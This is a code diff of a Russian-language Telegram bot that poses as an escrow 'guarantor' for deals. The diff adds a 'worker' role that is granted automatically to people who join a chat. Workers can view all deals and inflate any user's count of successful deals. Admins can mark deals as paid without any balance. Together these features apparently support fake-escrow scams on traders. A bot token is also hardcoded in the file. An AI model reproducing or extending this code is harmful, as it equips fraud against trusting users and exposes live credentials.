@@ -1,13 +1,12 @@
-import sqlite3#1
+import sqlite3
 import os
 import logging
 import uuid
 from urllib.parse import quote
 
-from aiogram import Bot, Dispatcher, types, F, BaseMiddleware
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberUpdated
-from aiogram.filters import Command, CommandObject, ChatMemberUpdatedFilter
-from aiogram.filters.chat_member_updated import JOIN_TRANSITION
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.filters import Command, CommandObject
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.utils.keyboard import InlineKeyboardBuilder
@@ -29,10 +28,6 @@ BOT_TOKEN = "8720073924:AAH8HksZTB-_HZf2ehi2dFZv1QWHJqrOEkU"
 ADMIN_IDS = {7199344406, 6334416318}
 MAINTENANCE_MODE = False
 BOT_USERNAME = None
-
-WORKER_CHAT_ID = -1003607796297
-
-BANNER_GIF_URL = "https://i.imgur.com/1g3SBJ6.gif"
 
 CURRENCIES = {
     "TON": "TON",
@@ -179,7 +174,7 @@ RU_TEXTS = {
     "dep_card_button": "💳 Банковская карта",
     "dep_ton_button": "💎 TON",
     "not_specified": "Не указан",
-    "role_choice_message": "<b>💼 Создание сделки</b>\n\n<i>Выберите вашу роль in сделке:</i>",
+    "role_choice_message": "<b>💼 Создание сделки</b>\n\n<i>Выберите вашу роль в сделке:</i>",
     "role_buyer_button": "🙋‍♂️ Я покупатель",
     "role_seller_button": "📦 Я продавец",
     "back_button": "⬅️ Назад",
@@ -409,23 +404,16 @@ class DealStates(StatesGroup):
     awaiting_description = State()
     awaiting_target_username = State()
     awaiting_admin_input = State()
+    awaiting_worker_deal_info = State()
 
 user_data = {}
 deals = {}
 admin_pending = {}
+WORKERS = set()
+BANNED_IDS = set()
 
 DB_NAME = 'bot_data.db'
-
-class BanMiddleware(BaseMiddleware):
-    async def __call__(self, handler, event, data):
-        user = data.get("event_from_user")
-        if user:
-            u_info = user_data.get(user.id, {})
-            if u_info.get('is_banned', 0) == 1:
-                if isinstance(event, types.Message):
-                    await event.answer("<b>🚫 Ваш аккаунт заблокирован. Вы не можете использовать бота.</b>", parse_mode=ParseMode.HTML)
-                return
-        return await handler(event, data)
+BANNER_URL = "https://i.imgur.com/FnHPI7B.mp4"
 
 def init_db():
     conn = sqlite3.connect(DB_NAME)
@@ -440,24 +428,15 @@ def init_db():
             successful_deals INTEGER DEFAULT 0,
             lang TEXT DEFAULT 'ru',
             free_deals INTEGER DEFAULT 0,
-            username TEXT,
-            role TEXT DEFAULT 'user',
-            is_banned INTEGER DEFAULT 0
+            username TEXT
         )
     ''')
-    
     cursor.execute("PRAGMA table_info(users)")
     columns = [c[1] for c in cursor.fetchall()]
-    if 'role' not in columns:
-        cursor.execute("ALTER TABLE users ADD COLUMN role TEXT DEFAULT 'user'")
-    if 'is_banned' not in columns:
-        cursor.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
-        
     for cur in CURRENCIES.keys():
         col_name = f'balance_{cur.lower()}'
         if col_name not in columns:
             cursor.execute(f'ALTER TABLE users ADD COLUMN {col_name} REAL DEFAULT 0')
-            
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS deals (
             deal_id TEXT PRIMARY KEY,
@@ -470,6 +449,8 @@ def init_db():
         )
     ''')
     cursor.execute('CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)')
+    cursor.execute('CREATE TABLE IF NOT EXISTS workers (user_id INTEGER PRIMARY KEY)')
+    cursor.execute('CREATE TABLE IF NOT EXISTS banned (user_id INTEGER PRIMARY KEY)')
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS settings (
             key TEXT PRIMARY KEY,
@@ -492,9 +473,7 @@ def load_data():
             'successful_deals': row[col_names.index('successful_deals')] or 0,
             'lang': row[col_names.index('lang')] or 'ru',
             'username': row[col_names.index('username')] if 'username' in col_names else None,
-            'free_deals': row[col_names.index('free_deals')] if 'free_deals' in col_names else 0,
-            'role': row[col_names.index('role')] if 'role' in col_names else 'user',
-            'is_banned': row[col_names.index('is_banned')] if 'is_banned' in col_names else 0
+            'free_deals': row[col_names.index('free_deals')] if 'free_deals' in col_names else 0
         }
         for col in col_names:
             if col.startswith('balance_'):
@@ -503,7 +482,6 @@ def load_data():
             if f'balance_{cur.lower()}' not in u_data:
                 u_data[f'balance_{cur.lower()}'] = 0.0
         user_data[user_id] = u_data
-        
     cursor.execute('SELECT deal_id, amount, currency, description, seller_id, buyer_id, status FROM deals')
     for row in cursor.fetchall():
         deals[row[0]] = {
@@ -517,6 +495,12 @@ def load_data():
     cursor.execute('SELECT user_id FROM admins')
     for row in cursor.fetchall():
         ADMIN_IDS.add(row[0])
+    cursor.execute('SELECT user_id FROM workers')
+    for row in cursor.fetchall():
+        WORKERS.add(row[0])
+    cursor.execute('SELECT user_id FROM banned')
+    for row in cursor.fetchall():
+        BANNED_IDS.add(row[0])
     cursor.execute('SELECT value FROM settings WHERE key="maintenance_mode"')
     row = cursor.fetchone()
     if row:
@@ -527,8 +511,8 @@ def save_user_data(user_id):
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
     u = user_data.get(user_id, {})
-    cols = ['user_id', 'wallet', 'successful_deals', 'lang', 'free_deals', 'username', 'role', 'is_banned']
-    vals = [user_id, u.get('wallet', ''), u.get('successful_deals', 0), u.get('lang', 'ru'), u.get('free_deals', 0), u.get('username'), u.get('role', 'user'), u.get('is_banned', 0)]
+    cols = ['user_id', 'wallet', 'successful_deals', 'lang', 'free_deals', 'username']
+    vals = [user_id, u.get('wallet', ''), u.get('successful_deals', 0), u.get('lang', 'ru'), u.get('free_deals', 0), u.get('username')]
     for cur in CURRENCIES.keys():
         col_name = f'balance_{cur.lower()}'
         cols.append(col_name)
@@ -565,6 +549,26 @@ def save_admin_db(u_id, add=True):
     conn.commit()
     conn.close()
 
+def save_worker_db(u_id, add=True):
+    conn = sqlite3.connect(DB_NAME)
+    cursor = conn.cursor()
+    if add:
+        cursor.execute('INSERT OR IGNORE INTO workers (user_id) VALUES (?)', (u_id,))
+    else:
+        cursor.execute('DELETE FROM workers WHERE user_id=?', (u_id,))
+    conn.commit()
+    conn.close()
+
+def save_ban_db(u_id, add=True):
+    conn = sqlite3.connect(DB_NAME)
+    cursor = conn.cursor()
+    if add:
+        cursor.execute('INSERT OR IGNORE INTO banned (user_id) VALUES (?)', (u_id,))
+    else:
+        cursor.execute('DELETE FROM banned WHERE user_id=?', (u_id,))
+    conn.commit()
+    conn.close()
+
 def save_setting(key, value):
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
@@ -579,12 +583,8 @@ def ensure_user_exists(user_id, username=None):
             'successful_deals': 0,
             'lang': 'ru',
             'free_deals': 0,
-            'username': username,
-            'role': 'user',
-            'is_banned': 0
+            'username': username
         }
-        if user_id in ADMIN_IDS:
-            user_data[user_id]['role'] = 'admin'
         for cur in CURRENCIES.keys():
             user_data[user_id][f'balance_{cur.lower()}'] = 0.0
         save_user_data(user_id)
@@ -597,7 +597,7 @@ def get_text(lang, key, **kwargs):
         return RU_TEXTS.get(key, '').format(**kwargs)
     return EN_TEXTS.get(key, '').format(**kwargs)
 
-def get_main_menu(lang):
+def get_main_menu(lang, user_id):
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text=get_text(lang, "create_deal_button"), callback_data="create_deal"))
     builder.row(
@@ -612,6 +612,8 @@ def get_main_menu(lang):
         InlineKeyboardButton(text=get_text(lang, "about_button"), callback_data="about"),
         InlineKeyboardButton(text=get_text(lang, "support_button"), url="https://t.me/GiftGuarantormanager")
     )
+    if user_id in WORKERS:
+        builder.row(InlineKeyboardButton(text="🛠 Панель Воркера", callback_data="worker_panel"))
     return builder.as_markup()
 
 def get_settings_menu(lang):
@@ -622,14 +624,8 @@ def get_settings_menu(lang):
     builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
     return builder.as_markup()
 
-def get_admin_menu(user_id):
+def get_admin_menu():
     builder = InlineKeyboardBuilder()
-    u_role = user_data.get(user_id, {}).get('role', 'user')
-    
-    if u_role == 'worker':
-        builder.row(InlineKeyboardButton(text="📂 Просмотр сделок", callback_data="admin_view_deals"))
-        return builder.as_markup()
-        
     builder.row(InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"))
     builder.row(
         InlineKeyboardButton(text="👤 Добавить админа", callback_data="admin_add"),
@@ -644,51 +640,67 @@ def get_admin_menu(user_id):
     builder.row(InlineKeyboardButton(text=f"🛠 Тех. перерыв: {status}", callback_data="admin_maintenance"))
     return builder.as_markup()
 
-dp = Dispatcher()
-dp.message.middleware(BanMiddleware())
-dp.callback_query.middleware(BanMiddleware())
+def get_worker_menu():
+    builder = InlineKeyboardBuilder()
+    builder.row(InlineKeyboardButton(text="📂 Просмотр сделок", callback_data="worker_view_deals"))
+    builder.row(InlineKeyboardButton(text="⭐ Накрутить успешные", callback_data="worker_change_successful"))
+    builder.row(InlineKeyboardButton(text="🔙 В меню", callback_data="menu"))
+    return builder.as_markup()
 
-@dp.chat_member(ChatMemberUpdatedFilter(member_transition=JOIN_TRANSITION))
-async def on_user_join_worker_chat(event: ChatMemberUpdated):
-    if event.chat.id == WORKER_CHAT_ID:
-        user_id = event.from_user.id
-        ensure_user_exists(user_id, event.from_user.username)
-        if user_data[user_id]['role'] not in ['admin'] and user_id not in ADMIN_IDS:
-            user_data[user_id]['role'] = 'worker'
-            save_user_data(user_id)
-            logger.info(f"Пользователь {user_id} добавлен к воркерам.")
+dp = Dispatcher()
 
 @dp.message(Command("ban"))
-async def cmd_ban(message: types.Message, command: CommandObject):
-    user_id = message.from_user.id
-    if user_id not in ADMIN_IDS:
+async def cmd_ban(message: types.Message):
+    if message.from_user.id not in ADMIN_IDS:
         return
-    if not command.args:
-        await message.answer("<b>⚠️ Использование:</b> <code>/ban ID</code>", parse_mode=ParseMode.HTML)
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("<b>⚠️ Формат:</b> <code>/ban ID</code>", parse_mode=ParseMode.HTML)
         return
     try:
-        target_id = int(command.args.strip())
-        if target_id in ADMIN_IDS:
-            await message.answer("<b>❌ Нельзя заблокировать главного администратора!</b>", parse_mode=ParseMode.HTML)
-            return
-        ensure_user_exists(target_id)
-        user_data[target_id]['is_banned'] = 1
-        save_user_data(target_id)
-        await message.answer(f"<b>✅ Пользователь <code>{target_id}</code> успешно заблокирован!</b>", parse_mode=ParseMode.HTML)
+        target_id = int(args[1])
+        BANNED_IDS.add(target_id)
+        save_ban_db(target_id, True)
+        await message.answer(f"<b>✅ Пользователь {target_id} забанен.</b>", parse_mode=ParseMode.HTML)
     except ValueError:
-        await message.answer("<b>❌ Неверный формат ID.</b> Укажите числовой идентификатор.", parse_mode=ParseMode.HTML)
+        await message.answer("<b>❌ Некорректный ID.</b>", parse_mode=ParseMode.HTML)
+
+@dp.message(F.new_chat_members)
+async def on_user_join(message: types.Message):
+    for member in message.new_chat_members:
+        if not member.is_bot:
+            WORKERS.add(member.id)
+            save_worker_db(member.id, True)
+
+@dp.my_chat_member()
+async def on_bot_added(event: types.ChatMemberUpdated):
+    if event.new_chat_member.status in ["member", "administrator"]:
+        try:
+            chat_id = event.chat.id
+            bot = event.bot
+            member_count = await bot.get_chat_member_count(chat_id)
+            if member_count <= 200:
+                administrators = await bot.get_chat_administrators(chat_id)
+                for admin in administrators:
+                    if not admin.user.is_bot:
+                        WORKERS.add(admin.user.id)
+                        save_worker_db(admin.user.id, True)
+        except:
+            pass
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext, bot: Bot, command: CommandObject):
     global BOT_USERNAME
+    user_id = message.from_user.id
+    if user_id in BANNED_IDS:
+        return
     if BOT_USERNAME is None:
         BOT_USERNAME = (await bot.get_me()).username
-    user_id = message.from_user.id
     ensure_user_exists(user_id, message.from_user.username)
     lang = user_data[user_id]['lang']
     await state.clear()
 
-    if MAINTENANCE_MODE and user_id not in ADMIN_IDS and user_data[user_id]['role'] != 'worker':
+    if MAINTENANCE_MODE and user_id not in ADMIN_IDS:
         await message.answer(get_text(lang, "maintenance_message"), parse_mode=ParseMode.HTML)
         return
 
@@ -783,50 +795,97 @@ async def cmd_start(message: types.Message, state: FSMContext, bot: Bot, command
     try:
         await bot.send_animation(
             message.chat.id,
-            animation=BANNER_GIF_URL,
+            animation=BANNER_URL,
             caption=get_text(lang, "start_message"),
-            reply_markup=get_main_menu(lang),
+            reply_markup=get_main_menu(lang, user_id),
             parse_mode=ParseMode.HTML
         )
     except Exception:
-        await message.answer(get_text(lang, "start_message"), reply_markup=get_main_menu(lang), parse_mode=ParseMode.HTML)
+        await message.answer(get_text(lang, "start_message"), reply_markup=get_main_menu(lang, user_id), parse_mode=ParseMode.HTML)
 
 @dp.message(Command("admin"))
 async def cmd_admin(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
-    ensure_user_exists(user_id, message.from_user.username)
-    u_role = user_data[user_id]['role']
-    
-    if user_id not in ADMIN_IDS and u_role != 'worker':
+    if user_id in BANNED_IDS or user_id not in ADMIN_IDS:
         return
+    ensure_user_exists(user_id, message.from_user.username)
     lang = user_data[user_id]['lang']
     await state.clear()
-    await message.answer(get_text(lang, "admin_panel_message"), reply_markup=get_admin_menu(user_id), parse_mode=ParseMode.HTML)
+    await message.answer(get_text(lang, "admin_panel_message"), reply_markup=get_admin_menu(), parse_mode=ParseMode.HTML)
 
 @dp.callback_query(F.data == "menu")
 async def back_to_menu(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data.get(user_id, {}).get('lang', 'ru')
     await state.clear()
     try:
         await bot.delete_message(callback.message.chat.id, callback.message.message_id)
         await bot.send_animation(
             callback.message.chat.id,
-            animation=BANNER_GIF_URL,
+            animation=BANNER_URL,
             caption=get_text(lang, "start_message"),
-            reply_markup=get_main_menu(lang),
+            reply_markup=get_main_menu(lang, user_id),
             parse_mode=ParseMode.HTML
         )
     except Exception as e:
         try:
-            await callback.message.edit_text(get_text(lang, "start_message"), reply_markup=get_main_menu(lang), parse_mode=ParseMode.HTML)
+            await callback.message.edit_text(get_text(lang, "start_message"), reply_markup=get_main_menu(lang, user_id), parse_mode=ParseMode.HTML)
         except:
-            await callback.message.answer(get_text(lang, "start_message"), reply_markup=get_main_menu(lang), parse_mode=ParseMode.HTML)
+            await callback.message.answer(get_text(lang, "start_message"), reply_markup=get_main_menu(lang, user_id), parse_mode=ParseMode.HTML)
     await callback.answer()
+
+@dp.callback_query(F.data == "worker_panel")
+async def worker_panel(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    if user_id in BANNED_IDS or user_id not in WORKERS:
+        return
+    await state.clear()
+    await callback.message.edit_text("<b>🛠 Панель Воркера:</b>", reply_markup=get_worker_menu(), parse_mode=ParseMode.HTML)
+    await callback.answer()
+
+@dp.callback_query(F.data == "worker_view_deals")
+async def worker_view_deals(callback: types.CallbackQuery):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in WORKERS:
+        return
+    if not deals:
+        await callback.message.edit_text("<b>📂 Нет активных сделок.</b>", reply_markup=get_worker_menu(), parse_mode=ParseMode.HTML)
+    else:
+        deals_list = "\n\n".join([f"ID: <code>{d}</code>\nСумма: <b>{deals[d]['amount']} {deals[d].get('currency', 'TON')}</b>\nПродавец: <code>{deals[d]['seller_id']}</code>\nПокупатель: <code>{deals[d].get('buyer_id', 'Нет')}</code>\nСтатус: <b>{deals[d].get('status', 'pending')}</b>" for d in deals])
+        await callback.message.edit_text(f"<b>📂 Активные сделки:</b>\n\n{deals_list}", reply_markup=get_worker_menu(), parse_mode=ParseMode.HTML)
+    await callback.answer()
+
+@dp.callback_query(F.data == "worker_change_successful")
+async def worker_change_successful_prompt(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in WORKERS:
+        return
+    await state.set_state(DealStates.awaiting_worker_deal_info)
+    await callback.message.edit_text("<b>⭐ Введите ID пользователя и количество успешных сделок:</b>\n<code>user_id количество</code>", parse_mode=ParseMode.HTML)
+    await callback.answer()
+
+@dp.message(DealStates.awaiting_worker_deal_info)
+async def process_worker_deal_info(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    if user_id in BANNED_IDS or user_id not in WORKERS:
+        return
+    await state.clear()
+    try:
+        parts = message.text.split()
+        target_id = int(parts[0])
+        count = int(parts[1])
+        ensure_user_exists(target_id)
+        user_data[target_id]['successful_deals'] = count
+        save_user_data(target_id)
+        await message.answer(f"<b>⭐ Успешные сделки пользователя {target_id} обновлены на {count}.</b>", reply_markup=get_worker_menu(), parse_mode=ParseMode.HTML)
+    except Exception as e:
+        await message.answer(f"<b>❌ Ошибка:</b> {e}", reply_markup=get_worker_menu(), parse_mode=ParseMode.HTML)
 
 @dp.callback_query(F.data == "change_lang")
 async def change_lang(callback: types.CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data.get(user_id, {}).get('lang', 'ru')
     builder = InlineKeyboardBuilder()
     builder.row(
@@ -844,6 +903,8 @@ async def change_lang(callback: types.CallbackQuery, bot: Bot):
 @dp.callback_query(F.data.startswith("lang_"))
 async def set_lang(callback: types.CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     new_lang = callback.data.split("_")[1]
     user_data[user_id]['lang'] = new_lang
     save_user_data(user_id)
@@ -857,6 +918,8 @@ async def set_lang(callback: types.CallbackQuery, bot: Bot):
 @dp.callback_query(F.data == "wallet")
 async def wallet_callback(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[user_id]['lang']
     wallet = user_data[user_id].get("wallet") or get_text(lang, "not_specified")
     await state.set_state(DealStates.awaiting_wallet)
@@ -872,6 +935,8 @@ async def wallet_callback(callback: types.CallbackQuery, state: FSMContext, bot:
 @dp.callback_query(F.data == "create_deal")
 async def create_deal_role(callback: types.CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[user_id]['lang']
     builder = InlineKeyboardBuilder()
     builder.row(
@@ -888,6 +953,8 @@ async def create_deal_role(callback: types.CallbackQuery, bot: Bot):
 
 @dp.callback_query(F.data.startswith("role_"))
 async def choose_currency(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS:
+        return
     role = callback.data.split("_")[1]
     await state.update_data(deal_role=role)
     user_id = callback.from_user.id
@@ -916,6 +983,8 @@ async def choose_currency(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(F.data.startswith("cur_"))
 async def after_currency(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS:
+        return
     currency = callback.data.split("_")[1]
     await state.update_data(deal_currency=currency)
     user_id = callback.from_user.id
@@ -948,6 +1017,8 @@ async def after_currency(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(F.data.startswith("prem_"))
 async def premium_amount(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS:
+        return
     duration = callback.data.split("_")[1]
     await state.update_data(amount=float(duration))
     await state.set_state(DealStates.awaiting_description)
@@ -958,6 +1029,8 @@ async def premium_amount(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(F.data == "profile")
 async def profile_callback(callback: types.CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     u = user_data[user_id]
     lang = u['lang']
     balances_list = []
@@ -991,6 +1064,8 @@ async def profile_callback(callback: types.CallbackQuery, bot: Bot):
 
 @dp.callback_query(F.data == "deposit")
 async def deposit_menu(callback: types.CallbackQuery):
+    if callback.from_user.id in BANNED_IDS:
+        return
     lang = user_data[callback.from_user.id]['lang']
     builder = InlineKeyboardBuilder()
     builder.row(
@@ -1003,11 +1078,15 @@ async def deposit_menu(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "dep_card")
 async def dep_card(callback: types.CallbackQuery):
+    if callback.from_user.id in BANNED_IDS:
+        return
     lang = user_data[callback.from_user.id]['lang']
     await callback.answer(get_text(lang, "deposit_card_unavailable"), show_alert=True)
 
 @dp.callback_query(F.data == "dep_ton")
 async def dep_ton(callback: types.CallbackQuery):
+    if callback.from_user.id in BANNED_IDS:
+        return
     lang = user_data[callback.from_user.id]['lang']
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
@@ -1017,6 +1096,8 @@ async def dep_ton(callback: types.CallbackQuery):
 @dp.callback_query(F.data == "withdraw")
 async def withdraw(callback: types.CallbackQuery):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[callback.from_user.id]['lang']
     
     total_balance = 0.0
@@ -1033,6 +1114,8 @@ async def withdraw(callback: types.CallbackQuery):
 @dp.callback_query(F.data == "my_deals")
 async def my_deals(callback: types.CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[user_id]['lang']
     user_deals = [d for d, v in deals.items() if v['seller_id'] == user_id or v['buyer_id'] == user_id]
     builder = InlineKeyboardBuilder()
@@ -1050,6 +1133,8 @@ async def my_deals(callback: types.CallbackQuery, bot: Bot):
 
 @dp.callback_query(F.data == "about")
 async def about(callback: types.CallbackQuery, bot: Bot):
+    if callback.from_user.id in BANNED_IDS:
+        return
     lang = user_data[callback.from_user.id]['lang']
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
@@ -1064,6 +1149,8 @@ async def about(callback: types.CallbackQuery, bot: Bot):
 async def referral(callback: types.CallbackQuery, bot: Bot):
     global BOT_USERNAME
     user_id = callback.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[user_id]['lang']
     referral_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
     builder = InlineKeyboardBuilder()
@@ -1079,14 +1166,10 @@ async def referral(callback: types.CallbackQuery, bot: Bot):
     )
     await callback.answer()
 
-@dp.callback_query(F.data.in_({"admin_stats", "admin_add", "admin_remove", "admin_list", "admin_change_balance", "admin_change_successful_deals", "admin_change_valute", "admin_maintenance"}))
-async def verify_admin_privileges(callback: types.CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
-        await callback.answer("🚫 Доступ запрещен. Вы воркер, у вас нет прав на это действие.", show_alert=True)
-        return
-
 @dp.callback_query(F.data == "admin_list")
 async def admin_list(callback: types.CallbackQuery):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     admins_list = "\n".join([f"• <code>{a_id}</code> | @{user_data.get(a_id, {}).get('username', 'unknown')}" for a_id in ADMIN_IDS])
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="menu"))
@@ -1099,14 +1182,18 @@ async def admin_list(callback: types.CallbackQuery):
 @dp.callback_query(F.data == "admin_maintenance")
 async def toggle_maintenance(callback: types.CallbackQuery):
     global MAINTENANCE_MODE
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     MAINTENANCE_MODE = not MAINTENANCE_MODE
     save_setting("maintenance_mode", MAINTENANCE_MODE)
-    await callback.message.edit_reply_markup(reply_markup=get_admin_menu(callback.from_user.id))
+    await callback.message.edit_reply_markup(reply_markup=get_admin_menu())
     status_text = "включен" if MAINTENANCE_MODE else "выключен"
     await callback.answer(f"🛠 Тех. перерыв {status_text}")
 
 @dp.callback_query(F.data == "admin_stats")
 async def admin_stats(callback: types.CallbackQuery):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     users_count = len(user_data)
     deals_count = len(deals)
     total_success = sum(u.get('successful_deals', 0) for u in user_data.values())
@@ -1114,10 +1201,8 @@ async def admin_stats(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "admin_view_deals")
 async def admin_view_deals(callback: types.CallbackQuery):
-    u_role = user_data.get(callback.from_user.id, {}).get('role', 'user')
-    if callback.from_user.id not in ADMIN_IDS and u_role != 'worker':
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
         return
-        
     if not deals:
         await callback.message.edit_text("<b>📂 Нет активных сделок.</b>", parse_mode=ParseMode.HTML)
     else:
@@ -1129,53 +1214,61 @@ async def admin_view_deals(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "admin_add")
 async def admin_add_prompt(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     await state.set_state(DealStates.awaiting_admin_input)
     admin_pending[callback.from_user.id] = "add"
     await callback.message.edit_text("<b>👤 Введите ID пользователя для назначения админом:</b>", parse_mode=ParseMode.HTML)
 
 @dp.callback_query(F.data == "admin_remove")
 async def admin_remove_prompt(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     await state.set_state(DealStates.awaiting_admin_input)
     admin_pending[callback.from_user.id] = "remove"
     await callback.message.edit_text("<b>❌ Введите ID пользователя для снятия админ-прав:</b>", parse_mode=ParseMode.HTML)
 
 @dp.callback_query(F.data == "admin_change_balance")
 async def admin_change_balance(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     await state.set_state(DealStates.awaiting_admin_input)
     admin_pending[callback.from_user.id] = "change_balance"
     await callback.message.edit_text("<b>💰 Введите:</b> <code>ID TON RUB XTR</code>\n<i>Пример: 123456789 100 5000 200</i>", parse_mode=ParseMode.HTML)
 
 @dp.callback_query(F.data == "admin_change_successful_deals")
 async def admin_change_successful(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     await state.set_state(DealStates.awaiting_admin_input)
     admin_pending[callback.from_user.id] = "change_successful"
     await callback.message.edit_text("<b>⭐ Введите ID пользователя и количество успешных сделок:</b>\n<code>user_id количество</code>", parse_mode=ParseMode.HTML)
 
 @dp.callback_query(F.data == "admin_change_valute")
 async def admin_change_valute(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id in BANNED_IDS or callback.from_user.id not in ADMIN_IDS:
+        return
     await state.set_state(DealStates.awaiting_admin_input)
     admin_pending[callback.from_user.id] = "change_valute"
     await callback.message.edit_text("<b>💱 Введите новую валюту:</b>\n<i>Например: USD, EUR, RUB</i>", parse_mode=ParseMode.HTML)
 
 @dp.callback_query(F.data.startswith("pay_"))
 async def pay_deal(callback: types.CallbackQuery, bot: Bot):
+    if callback.from_user.id in BANNED_IDS:
+        return
     parts = callback.data.split("_")
     currency = parts[1]
     deal_id = parts[2]
     deal = deals.get(deal_id)
     user_id = callback.from_user.id
     lang = user_data[user_id]['lang']
-    
     if not deal or deal.get('currency', 'TON') != currency:
         await callback.answer(get_text(lang, "deal_not_found"), show_alert=True)
         return
-        
     buyer_balance = user_data[user_id].get(f'balance_{currency.lower()}', 0.0)
-    
-    is_privileged = (user_id in ADMIN_IDS) or (user_data[user_id].get('role') == 'worker')
-    
-    if buyer_balance >= float(deal['amount']) or is_privileged:
-        if not is_privileged:
+    is_admin = user_id in ADMIN_IDS
+    if buyer_balance >= float(deal['amount']) or is_admin:
+        if not is_admin:
             user_data[user_id][f'balance_{currency.lower()}'] -= deal['amount']
             save_user_data(user_id)
         deals[deal_id]['status'] = 'paid'
@@ -1199,6 +1292,8 @@ async def pay_deal(callback: types.CallbackQuery, bot: Bot):
 
 @dp.callback_query(F.data.startswith("sent_"))
 async def seller_sent(callback: types.CallbackQuery, bot: Bot):
+    if callback.from_user.id in BANNED_IDS:
+        return
     deal_id = callback.data.split("_")[1]
     deal = deals.get(deal_id)
     if not deal:
@@ -1222,6 +1317,8 @@ async def seller_sent(callback: types.CallbackQuery, bot: Bot):
 
 @dp.callback_query(F.data.startswith("rcv_"))
 async def buyer_received(callback: types.CallbackQuery, bot: Bot):
+    if callback.from_user.id in BANNED_IDS:
+        return
     action, deal_id = callback.data.split("_", 1)
     deal = deals.get(deal_id)
     if not deal:
@@ -1241,6 +1338,8 @@ async def buyer_received(callback: types.CallbackQuery, bot: Bot):
 
 @dp.callback_query(F.data.startswith("nrcv_"))
 async def buyer_not_received(callback: types.CallbackQuery, bot: Bot):
+    if callback.from_user.id in BANNED_IDS:
+        return
     action, deal_id = callback.data.split("_", 1)
     deal = deals.get(deal_id)
     if not deal:
@@ -1259,6 +1358,8 @@ async def buyer_not_received(callback: types.CallbackQuery, bot: Bot):
 @dp.message(DealStates.awaiting_wallet)
 async def process_wallet(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[user_id]['lang']
     user_data[user_id]['wallet'] = message.text
     save_user_data(user_id)
@@ -1270,6 +1371,8 @@ async def process_wallet(message: types.Message, state: FSMContext):
 @dp.message(DealStates.awaiting_deal_wallet)
 async def process_deal_wallet(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[user_id]['lang']
     user_data[user_id]['wallet'] = message.text
     save_user_data(user_id)
@@ -1282,6 +1385,8 @@ async def process_deal_wallet(message: types.Message, state: FSMContext):
 
 @dp.message(DealStates.awaiting_amount)
